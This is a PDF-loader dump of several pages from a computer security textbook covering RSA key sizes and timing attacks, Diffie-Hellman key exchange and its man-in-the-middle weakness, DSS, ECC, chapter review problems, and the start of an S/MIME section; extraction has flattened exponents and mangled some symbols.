       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 674, 'page_label': '673'}, page_content='21.4 / THE RSA PUblIC-KEy ENCRyPTION AlgORITHM  673\\nfurther refinements in the GNFS, and the use of an even better algorithm is also a \\npossibility. In fact, a related algorithm, the special number field sieve (SNFS), can \\nfactor numbers with a specialized form considerably faster than the generalized num-\\nber field sieve. It is reasonable to expect a breakthrough that would enable a general \\nfactoring performance in about the same time as SNFS, or even better. Thus, we need \\nto be careful in choosing a key size for RSA. For the near future, a key size in the \\nrange of 1024 to 2048 bits seems secure.\\nIn addition to specifying the size of n, a number of other constraints have been \\nsuggested by researchers. To avoid values of n that may be factored more easily, the \\nalgorithm’s inventors suggest the following constraints on p and q:\\n1. p and q should dif fer in length by only a few digits. Thus, for a 1024-bit key \\n(309 decimal digits), both p and q should be on the order of magnitude of 1075  \\nto 10100.\\n2. Both (p - 1) and (q - 1) should contain a large prime factor.\\n3. gcd (p - 1, q - 1) should be small.\\nIn addition, it has been demonstrated that if e 6 n and d 6 n1/4, then d can be easily \\ndetermined [WIEN90].\\nTiming aTTacks If one needed yet another lesson about how difficult it is to assess \\nthe security of a cryptographic algorithm, the appearance of timing attacks provides a \\nstunning one. Paul Kocher, a cryptographic consultant, demonstrated that a snooper \\ncan determine a private key by keeping track of how long a computer takes to deci-\\npher messages [KOCH96]. Timing attacks are applicable not just to RSA, but also \\nto other public-key cryptography systems. This attack is alarming for two reasons: \\nIt comes from a completely unexpected direction, and it is a ciphertext-only attack.\\nA timing attack is somewhat analogous to a burglar guessing the combination \\nof a safe by observing how long it takes for someone to turn the dial from number to \\nNumber of Decimal \\nDigits Number of Bits Date Achieved\\n100 332 April 1991\\n110 365 April 1992\\n120 398 June 1993\\n129 428 April 1994\\n130 431 April 1996\\n140 465 February 1999\\n155 512 August 1999\\n160 530 April 2003\\n174 576 December 2003\\n200 663 May 2005\\n193 640 November 2005\\n232 768 December 2009\\nTable 21.2 Progress in Factorization\\nM21_STAL0611_04_GE_C21.indd   673 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 675, 'page_label': '674'}, page_content='674  CHAPTER 21 / PUblIC-KEy CRyPTOgRAPHy ANd MESSAgE AUTHENTICATION \\nnumber. The attack exploits the common use of a modular exponentiation algorithm in \\nRSA encryption and decryption, but the attack can be adapted to work with any imple-\\nmentation that does not run in fixed time. In the modular exponentiation  algorithm, \\nexponentiation is accomplished bit by bit, with one modular multiplication performed \\nat each iteration and an additional modular multiplication performed for each 1 bit.\\nAs Kocher points out in his paper, the attack is simplest to understand in an \\nextreme case. Suppose the target system uses a modular multiplication function that \\nis very fast in almost all cases but in a few cases takes much more time than an entire \\naverage modular exponentiation. The attack proceeds bit-by-bit starting with the \\nleftmost bit, bk. Suppose the first j bits are known (to obtain the entire exponent, \\nstart with j = 0 and repeat the attack until the entire exponent is known). For a given \\nciphertext, the attacker can complete the first j iterations. The operation of the subse-\\nquent step depends on the unknown exponent bit. If the bit is set, d d (d * a) mod n \\nwill be executed. For a few values of a and d, the modular multiplication will be \\nextremely slow, and the attacker knows which these are. Therefore, if the observed \\ntime to execute the decryption algorithm is always slow when this particular iteration \\nis slow with a 1 bit, then this bit is assumed to be 1. If a number of observed execution \\ntimes for the entire algorithm are fast, then this bit is assumed to be 0.\\nIn practice, modular exponentiation implementations do not have such extreme \\ntiming variations, in which the execution time of a single iteration can exceed the \\nmean execution time of the entire algorithm. Nevertheless, there is enough variation \\nto make this attack practical. For details, see [KOCH96].\\nAlthough the timing attack is a serious threat, there are simple countermeasures \\nthat can be used, including the following:\\n• Constant exponentiation time: Ensure that all exponentiations take the same \\namount of time before returning a result. This is a simple fix but does degrade \\nperformance.\\n• Random delay: Better performance could be achieved by adding a random delay \\nto the exponentiation algorithm to confuse the timing attack. Kocher points out \\nthat if defenders do not add enough noise, attackers could still succeed by col-\\nlecting additional measurements to compensate for the random delays.\\n• Blinding: Multiply the ciphertext by a r andom number before performing \\n exponentiation. This process prevents the attacker from knowing what cipher-\\ntext bits are being processed inside the computer and therefore prevents the \\nbit-by-bit analysis essential to the timing attack.\\nRSA Data Security incorporates a blinding feature into some of its products. \\nThe private-key operation M = Cd mod n is implemented as follows:\\n1. Generate a secret random number r between 0 and n - 1.\\n2. Compute C/uni2032= C(re) mod n, where e is the public exponent.\\n3. Compute M/uni2032= (C/uni2032)d mod n with the ordinary RSA implementation.\\n4. Compute M = M/uni2032r -1 mod n. In this equation, r -1 is the multiplicative inverse \\nof r mod n. It can be demonstrated that this is the correct result by observing \\nthat red mod n = r mod n.\\nRSA Data Security reports a 2 to 10% performance penalty for blinding.\\nM21_STAL0611_04_GE_C21.indd   674 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 676, 'page_label': '675'}, page_content='21.5 / dIFFIE-HEllMAN ANd OTHER ASyMMETRIC AlgORITHMS  675\\n 21.5 DIFFIE-HELLMAN AND OTHER ASYMMETRIC \\nALGORITHMS\\nDiffie-Hellman Key Exchange\\nThe first published public-key algorithm appeared in the seminal paper by Diffie and \\nHellman that defined public-key cryptography [DIFF76] and is generally referred to \\nas the Diffie-Hellman key exchange. A number of commercial products employ this \\nkey exchange technique.\\nThe purpose of the algorithm is to enable two users to exchange a secret key \\nsecurely that can then be used for subsequent encryption of messages. The algorithm \\nitself is limited to the exchange of the keys.\\nThe Diffie-Hellman algorithm depends for its effectiveness on the difficulty of \\ncomputing discrete logarithms. Briefly, we can define the discrete logarithm in the \\nfollowing way. First, we define a primitive root of a prime number p as one whose \\npowers generate all the integers from 1 to p - 1. That is, if a is a primitive root of the \\nprime number p, then the numbers\\na mod p, a2 mod p,c, ap - 1 mod p\\nare distinct and consist of the integers from 1 through p - 1 in some permutation.\\nFor any integer b less than p and a primitive root a of prime number p, one can \\nfind a unique exponent i such that\\nb = ai mod p    where 0 … i … (p - 1)\\nThe exponent i is referred to as the discrete logarithm, or index, of b for the \\nbase a, mod p. We denote this value as dloga,p(b).2\\nThe algoriThm With this background, we can define the Diffie-Hellman key \\nexchange, which is summarized in Figure 21.9. For this scheme, there are two pub -\\nlicly known numbers: a prime number q, and an integer a that is a primitive root of q. \\nSuppose the users A and B wish to exchange a key. User A selects a random integer \\nXA 6 q and computes YA = aXA mod q. Similarly, user B independently selects a \\nrandom integer XB 6 q and computes YB = aXB mod q. Each side keeps the X value \\nprivate and makes the Y value available publicly to the other side. User A computes \\nthe key as K = (YB)XA and user B computes the key as K = (YA)XB mod q. These two \\ncalculations produce identical results:\\n K = (YB)XA mod q\\n = (aXB mod q)XA mod q\\n = (aXB)XA mod q\\n = aXB XA mod q\\n = (aXA)XB mod q\\n = (aXA mod q)XB mod q\\n = (YA)XB mod q\\n2Many texts refer to the discrete logarithm as the index. There is no generally agreed notation for this \\nconcept, much less an agreed name.\\nM21_STAL0611_04_GE_C21.indd   675 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 677, 'page_label': '676'}, page_content='676  CHAPTER 21 / PUblIC-KEy CRyPTOgRAPHy ANd MESSAgE AUTHENTICATION \\nThe result is that the two sides have exchanged a secret value. Furthermore, \\nbecause XA and XB are private, an adversary only has the following ingredients to \\nwork with: q, a, YA, and YB. Thus, the adversary is forced to take a discrete logarithm \\nto determine the key. For example, to determine the private key of user B, an adver-\\nsary must compute\\nXB = dloga, q(YB)\\nThe adversary can then calculate the key K in the same manner as user B \\n calculates it.\\nThe security of the Diffie-Hellman key exchange lies in the fact that, while it \\nis relatively easy to calculate exponentials modulo a prime, it is very difficult to cal-\\nculate discrete logarithms. For large primes, the latter task is considered infeasible.\\nHere is an example. Key exchange is based on the use of the prime number \\nq = 353 and a primitive root of 353, in this case a = 3. A and B select secret keys \\nXA = 97 and XB = 233, respectively. Each computes its public key:\\n A computes YA = 397 mod 353 = 40.\\n B computes YB = 3233 mod 353 = 248.\\nAfter they exchange public keys, each can compute the common secret key:\\n A computes K = (YB)XA mod 353 = 24897 mod 353 = 160.\\n B computes K = (YA)XB mod 353 = 40233 mod 353 = 160.\\nFigure 21.9 The Diffie-Hellman Key Exchange Algorithm\\nGlobal Public Elements\\nq Prime number\\nc c 6 q and c a primitive root of q \\nUser B Ke y Generation\\nSelect private X B X B 6 q\\nCalculate public YB YB = cX B mod q\\nUser A Ke y Generation\\nSelect private X A X A 6 q\\nCalculate public YA YA = cX A  mod q\\nGeneration of Secret Ke y by User A\\nK = (YB)X A  mod q\\nGeneration of Secret Ke y by User B\\nK = (YA )X B mod q\\nM21_STAL0611_04_GE_C21.indd   676 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 678, 'page_label': '677'}, page_content='21.5 / dIFFIE-HEllMAN ANd OTHER ASyMMETRIC AlgORITHMS  677\\nWe assume an attacker would have available the following information:\\nq = 353; a = 3; YA = 40; YB = 248\\nIn this simple example, it would be possible by brute force to determine the \\nsecret key 160. In particular, an attacker E can determine the common key by discov-\\nering a solution to the equation 3a mod 353 = 40 or the equation 3b mod 353 = 248. \\nThe brute force approach is to calculate powers of 3 modulo 353, stopping when the \\nresult equals either 40 or 248. The desired answer is reached with the exponent value \\nof 97 , which provides 397 mod 353 = 40.\\nWith larger numbers, the problem becomes impractical.\\nkey exchange ProTocols Figure 21.10 shows a simple protocol that makes use \\nof the Diffie-Hellman calculation. Suppose user A wishes to set up a connection \\nwith user B, and use a secret key to encrypt messages on that connection. User A \\ncan generate a one-time private key XA, calculate YA, and send that to user B. User \\nB responds by generating a private value XB, calculating YB, and sending YB to user \\nA. Both users can now calculate the key. The necessary public values q and a would \\nneed to be known ahead of time. Alternatively, user A could pick values for q and a \\nand include those in the first message.\\nFigure 21.10 Diffie-Hellman Key Exchange\\n \\nAlice Bob\\nAlice and Bob share a\\nprime q and c, such that\\nc < q and c is a primitive\\nroot of q.\\nAlice generates a private\\nkey XA such that XA < q.\\nAlice calculates a public\\nkey YA = cXA mod q.\\nAlice receives Bob’s\\npublic key YB in plaintext.\\nAlice calculates shared\\nsecret key K = (YB)XA mod q.\\nBob calculates shared\\nsecret key K = (YA)XB mod q.\\nBob receives Alice’s\\npublic key YA in plaintext.\\nBob calculates a public\\nkey YB = cXB mod q.\\nBob generates a private\\nkey XB such that XB < q.\\nAlice and Bob share a\\nprime q and c, such that\\nc < q and c is a primitive\\nroot of q.\\nYA YB\\nM21_STAL0611_04_GE_C21.indd   677 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 679, 'page_label': '678'}, page_content='678  CHAPTER 21 / PUblIC-KEy CRyPTOgRAPHy ANd MESSAgE AUTHENTICATION \\nAs an example of another use of the Diffie-Hellman algorithm, suppose in a \\ngroup of users (e.g., all users on a LAN), each generates a long-lasting private key \\nand calculates a public key. These public values, together with global public values for \\nq and a, are stored in some central directory. At any time, user B can access user A’s \\npublic value, calculate a secret key, and use that to send an encrypted message to user \\nA. If the central directory is trusted, then this form of communication provides both \\nconfidentiality and a degree of authentication. Because only A and B can determine \\nthe key, no other user can read the message (confidentiality). User A knows that only \\nuser B could have created a message using this key (authentication). However, the \\ntechnique does not protect against replay attacks.\\nman-in-The-middle aTTack The protocol depicted in Figure 21.10 is insecure \\nagainst a man-in-the-middle attack. Suppose Alice and Bob wish to exchange keys, \\nand Darth is the adversary. The attack proceeds as follows:\\n1. Darth prepares for the attack by generating two random private keys XD1 and \\nXD2 and then computing the corresponding public keys YD1 and YD2.\\n2. Alice transmits YA to Bob.\\n3. Darth intercepts YA and transmits YD1 to Bob. Darth also calculates K2 =\\n(YA)XD2 mod q.\\n4. Bob receives YD1 and calculates K1 = (YD1)XB mod q.\\n5. Bob transmits YB to Alice.\\n6. Darth inter cepts YB and transmits YD2 to Alice. Darth calculates K1 =\\n(YB)XD1 mod q.\\n7. Alice receives YD2 and calculates K2 = (YD2)XA mod q.\\nAt this point, Bob and Alice think that they share a secret key, but instead Bob \\nand Darth share secret key K1 and Alice and Darth share secret key K2. All future \\ncommunication between Bob and Alice is compromised in the following way:\\n1. Alice sends an encrypted message M: E(K2, M).\\n2. Darth intercepts the encrypted message and decrypts it, to recover M.\\n3. Darth sends Bob E(K1, M) or E(K1, M/uni2032), where M/uni2032 is any message. In the first \\ncase, Darth simply wants to eavesdrop on the communication without altering \\nit. In the second case, Darth wants to modify the message going to Bob.\\nThe key exchange protocol is vulnerable to such an attack because it does not \\nauthenticate the participants. This vulnerability can be overcome with the use of \\ndigital signatures and public-key certificates; these topics are explored later in this \\nchapter, and in Chapter 2.\\nOther Public-Key Cryptography Algorithms\\nTwo other public-key algorithms have found commercial acceptance: DSS, and \\n elliptic-curve cryptography.\\ndigiTal signaTure sTandard The National Institute of Standards and  Technology \\n(NIST) has published this as Federal Information Processing Standard FIPS 186-4 \\n[Digital Signature Standard (DSS), July 2013]. The DSS makes use of the SHA-1 and \\nM21_STAL0611_04_GE_C21.indd   678 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 680, 'page_label': '679'}, page_content='21.6 / KEy TERMS, REVIEW QUESTIONS, ANd PROblEMS  679\\npresents a new digital signature technique, the Digital Signature Algorithm (DSA). \\nThe DSS was originally proposed in 1991 and revised in 1993 in response to public \\nfeedback concerning the security of the scheme. There were further minor revisions in \\n1996 and 2013. The DSS uses an algorithm that is designed to provide only the digital \\nsignature function. Unlike RSA, it cannot be used for encryption or key exchange.\\nelliPTic-curve cryPTograPhy The vast majority of the products and standards \\nthat use public-key cryptography for encryption and digital signatures use RSA. The \\nbit length for secure RSA use has increased over recent years, and this has put a \\nheavier processing load on applications using RSA. This burden has ramifications, \\nespecially for electronic commerce sites that conduct large numbers of secure trans-\\nactions. Recently, a competing system has begun to challenge RSA: elliptic curve \\ncryptography (ECC). Already, ECC is showing up in standardization efforts, including \\nthe IEEE P1363 Standard for Public-Key Cryptography. A version of ECC used for \\ndigital signature is included as an option in FIPS 186-4.\\nThe principal attraction of ECC compared to RSA is that it appears to offer \\nequal security for a far smaller bit size, thereby reducing processing overhead. On \\nthe other hand, although the theory of ECC has been around for some time, it is \\nonly recently that products have begun to appear and that there has been sustained \\ncryptanalytic interest in probing for weaknesses. Thus, the confidence level in ECC \\nis not yet as high as that in RSA.\\nECC is fundamentally more difficult to explain than either RSA or Diffie-\\nHellman, and a full mathematical description is beyond the scope of this book. The \\ntechnique is based on the use of a mathematical construct known as the elliptic curve.\\n 21.6 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\nKey Terms\\nDiffie-Hellman key exchange\\ndigital signature\\nDigital Signature Standard \\n(DSS)\\nelliptic-curve cryptography \\n(ECC)\\nHMAC\\nkey exchange\\nMD5\\nmessage authentication\\nmessage authentication code \\n(MAC)\\nmessage digest\\none-way hash function\\nprivate key\\npublic key\\npublic-key certificate\\npublic-key encryption\\nRSA\\nsecret key\\nSecure Hash Algorithm (SHA)\\nsecure hash function\\nSHA-1\\nSHA-2\\nSHA-3\\nstrong collision resistance\\nweak collision resistance\\nReview Questions\\n 21.1 In the context of a hash function, what is a compression function?\\n 21.2 Why is a message always padded before hashing with SHA-1 even when the message \\nis already a multiple of the block length?\\n 21.3 What are the minimum requirements for HMAC to be provably secure?\\nM21_STAL0611_04_GE_C21.indd   679 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 681, 'page_label': '680'}, page_content='680  CHAPTER 21 / PUblIC-KEy CRyPTOgRAPHy ANd MESSAgE AUTHENTICATION \\n 21.4 What is a one-way function?\\n 21.5 Briefly explain Diffie-Hellman key exchange.\\nProblems\\n 21.1 Consider a 32-bit hash function defined as the concatenation of two 16-bit functions:  \\nXOR and RXOR, defined in Section 21.2 as “two simple hash functions.”\\na. Will this checksum detect all err ors caused by an odd number of error bits? \\nExplain.\\nb. Will this checksum detect all errors caused by an even number of error bits? If not, \\ncharacterize the error patterns that will cause the checksum to fail.\\nc. Comment on the effectiveness of this function for use as a hash function for \\nauthentication.\\n 21.2 a. Consider the following hash function. Messages ar e in the form of a sequence \\nof decimal numbers, M = (a1, a2, c, at). The hash value h is calculated as \\nH(M) = q\\nt\\ni= 1ai mod n, for some predefined value n. Does this hash function \\nsatisfy the requirements for a hash function H listed in Section 2.2? Explain your \\nanswer.\\nb. Repeat part (a) for the hash function H(M) = q\\nt\\ni = 1(ai)2 mod n.\\nc. Calculate the hash function of part (b) for M = (18, 63, 90, 72, 34) and n = 99.\\n 21.3 It is possible to use a hash function to construct a block cipher with a structure similar \\nto DES. Because a hash function is one way and a block cipher must be reversible (to \\ndecrypt), how is it possible?\\n 21.4 Now consider the opposite problem: using an encryption algorithm to construct a one-\\nway hash function. Consider using RSA with a known key. Then process a message \\nconsisting of a sequence of blocks as follows: Encrypt the first block, XOR the result \\nwith the second block and encrypt again, and so on. Show that this scheme is not secure \\nby solving the following problem. Given a two-block message B1, B2, and its hash\\nRSAH(B1, B2) = RSA (RSA (B1) /uni2295.altB2)\\nand given an arbitrary block C1, choose C2 so that RSAH(C1, C2) = RSAH(B1, B2). \\nThus, the hash function does not satisfy weak collision resistance.\\n 21.5 Figure 21.11 shows an alternative means of implementing HMAC.\\na. Describe the operation of this implementation.\\nb. What potential benefit does this implementation have over that shown in Figure 21.4?\\n 21.6 Perform encryption and decryption using the RSA algorithm, as in Figure 21.8, for the \\nfollowing:\\na. p = 13; q = 31, e = 19; M = 2\\nb. p = 11; q = 31, e = 7; M = 4\\nc. p = 3; q = 17, e = 5; M = 5\\nd. p = 5; q = 17, e = 7; M = 6\\ne. p = 7; q = 17, e = 29; M = 3\\nHint: Decryption is not as hard as you think; use some finesse.\\n 21.7 In a public-key system using RSA, you intercept the ciphertext C = 61 sent to a user \\nwhose public key is e = 11, n = 91. What is the plaintext M?\\n 21.8 In an RSA system, the public key of Harry is as follows: e = 47, n = 4757. What is the \\nprivate key of Harry?\\n 21.9 In the RSA cryptosystem, it is obvious that if one can factor RSA modulus n = pq, then \\none can compute f(n) = (p - 1)(q - 1). As a result, one can also compute the secret \\nkey d since ed K 1 mod f(n). Prove the converse that if both n and f(n) are known, \\nthen one can find p and q without factoring n.\\nM21_STAL0611_04_GE_C21.indd   680 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 682, 'page_label': '681'}, page_content='21.6 / KEy TERMS, REVIEW QUESTIONS, ANd PROblEMS  681\\n 21.10 Consider the following scheme:\\n1. Pick an odd number, E.\\n2. Pick two prime numbers, P and Q, where (P - 1)(Q - 1) - 1 is evenly divisible \\nby E.\\n3. Multiply P and Q to get N.\\n4. Calculate D =\\n(P - 1)(Q - 1)(E - 1) + 1\\nE .\\nIs this scheme equivalent to RSA? Show why or why not.\\n 21.11 Suppose Bob uses the RS A cryptosystem with a very large modulus n for which the \\nfactorization cannot be found in a reasonable amount of time. Suppose Alice sends \\na message to Bob by representing each alphabetic character as an integer between \\n0 and 25 (A S 0, c, Z S 25), and then encrypting each number separately using \\nRSA with large e and large n. Is this method secure? If not, describe the most efficient \\nattack against this encryption method.\\n 21.12 Consider a Diffie-Hellman scheme with a common prime q = 23 and a primitive \\nroot a = 5.\\na. Alice has public key YA = 10, what is Alice’s private key XA?\\nb. Bob has public key YB = 8, what is the shared secret key K?\\nFigure 21.11 Alternative Implementation of HMAC\\nK +\\nSi\\nSo\\nY0 Y1 YL-1\\nb bits\\nb bits\\nb bits\\nb bits b bits\\nipad\\nPrecomputed Computed per message\\nK + opad\\nHashIV\\nn bits\\nn bits\\nPad to b bits\\nn bits\\nn bits\\nHMAC( K, M )\\nH(Si || M )\\nf\\nIV f f\\nM21_STAL0611_04_GE_C21.indd   681 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 683, 'page_label': '682'}, page_content='Internet Security  \\nProtocols and Standards\\nPart Five: Network Security\\n \\nCHAPTER \\n682\\n22.1 Secure E-mail and S/MIME\\nMIME\\nS/MIME\\n22.2 DomainKeys Identified Mail\\nInternet Mail Architecture\\nDKIM Strategy\\n22.3 Secure Sockets Layer (SSL) and Transport Layer Security (TLS)\\nTLS Architecture\\nTLS Protocols\\nTLS Attacks\\nSSL/TLS Attacks\\n22.4 HTTPS\\nConnection Initiation\\nConnection Closure\\n22.5 IPv4 and IPv6 Security\\nIP Security Overview\\nThe Scope of IPsec\\nSecurity Associations\\nEncapsulating Security Payload\\nTransport and Tunnel Modes\\n22.6 Key Terms, Review Questions, and Problems\\nM22_STAL0611_04_GE_C22.indd   682 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 684, 'page_label': '683'}, page_content='22.1 / SECURE E-MAIL AND S/MIME  683\\nThis chapter looks at some of the most widely used and important Internet security \\nprotocols and standards.\\n 22.1 SECURE E-MAIL AND S/MIME\\nS/MIME (Secure/Multipurpose Internet Mail Extension) is a security enhancement \\nto the MIME Internet e-mail format standard.\\nMIME\\nMIME is an extension to the old RFC 822 (Standard For The Format Of ARPA Internet \\nText Messages, 1982): specification of an Internet mail format. RFC 822 defines a simple \\nheader with To, From, Subject, and other fields that can be used to route an e-mail \\n message through the Internet and that pr ovides basic information about the e-mail \\ncontent. RFC 822 assumes a simple ASCII text format for the content.\\nMIME provides a number of new header fields that define information about \\nthe body of the message, including the format of the body and any encoding that \\nis done to facilitate transfer. Most important, MIME defines a number of content \\nformats, which standardize representations for the support of multimedia e-mail. \\nExamples include text, image, audio, and video.\\nS/MIME\\nS/MIME is a complex capability that is defined in a number of documents. The most \\nimportant documents relevant to S/MIME include the following:\\n• RFC 5750 (S/MIME Version 3.2 Certificate Handling, 2010): Specifies conven-\\ntions for X.509 certificate usage by (S/MIME) v3.2.\\n• RFC 5751  (S/MIME Version 3.2 Message Specification , 2010): The principal \\ndefining document for S/MIME message creation and processing.\\n• RFC 4134 (Examples of S/MIME Messages, 2005): Gives examples of message \\nbodies formatted using S/MIME.\\n• RFC 2634  (Enhanced Security Services for S/MIME , 1999): Describes four \\noptional security service extensions for S/MIME.\\nLearning Objectives\\nAfter studying this chapter, you should be able to:\\n ◆ Provide an overview of MIME.\\n ◆ Understand the functionality of S/MIME and the security threats it addresses.\\n ◆ Explain the key components of SSL.\\n ◆ Discuss the use of HTTPS.\\n ◆ Provide an overview of IPsec.\\n ◆ Discuss the format and functionality of the Encapsulating Security Payload.\\nM22_STAL0611_04_GE_C22.indd   683 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 685, 'page_label': '684'}, page_content='684  CHAPTER 22 / INTERNET SECURITy PRoToCoLS AND STANDARDS \\n• RFC 5652 (Cryptographic Message Syntax (CMS) , 2009): The Cryptographic \\n Message Syntax is used to digitally sign,  digest, authenticate, or encrypt arbi -\\ntrary message content.\\n• RFC 3370 (CMS Algorithms, 2002): Describes the conventions for using several \\ncryptographic algorithms with the CMS.\\n• RFC 5752 (Multiple Signatures in CMS , 2010): Describes the use of multiple, \\nparallel signatures for a message.\\n• RFC 1847  (Security Multiparts for MIME—Multipart/Signed and Multipart/\\nEncrypted, 1995): Defines a framework within which security services may be \\napplied to MIME body parts. The use of a digital signature is relevant to S/\\nMIME, as explained subsequently.\\nS/MIME functionality is built into the majority of modern e-mail software and \\ninteroperates between them. S/MIME is defined as a set of additional MIME content \\ntypes (see Table 22.1) and provides the ability to sign and/or encrypt e-mail messages.  \\nIn essence, these content types support four new functions:\\n• Enveloped data:  Consists of encrypted content of any type and encrypted-  \\ncontent encryption keys for one or more recipients.\\n• Signed data: A digital signature is formed by taking the message digest of the \\ncontent to be signed, then encrypting that with the private key of the signer. The \\ncontent plus signature are then encoded using base64 encoding. A signed data \\nmessage can only be viewed by a recipient with S/MIME capability.\\n• Clear-signed data:  As with signed data, a digital signature of the content is \\nformed. However, in this case, only the digital signature is encoded using \\nbase64. As a result, recipients without S/MIME capability can view the  message \\n content, although they cannot verify the signature.\\n• Signed and env eloped data: Signed-only and encrypted-only entities may be \\nnested, so encrypted data may be signed, and signed data or clear-signed data \\nmay be encrypted.\\nType Subtype S/MIME Parameter Description\\nMultipart Signed A clear-signed message in two parts: one is \\nthe message and the other is the signature.\\nApplication pkcs7-mime signedData A signed S/MIME entity\\npkcs7-mime envelopedData An encrypted S/MIME entity\\npkcs7-mime degenerate signedData An entity containing only public-key \\ncertificates\\npkcs7-mime CompressedData A compressed S/MIME entity\\npkcs7-signature signedData The content type of the signature subpart \\nof a multipart/signed message\\nTable 22.1 S/MIME Content Types\\nM22_STAL0611_04_GE_C22.indd   684 10/11/17   3:20 PM'),\n",
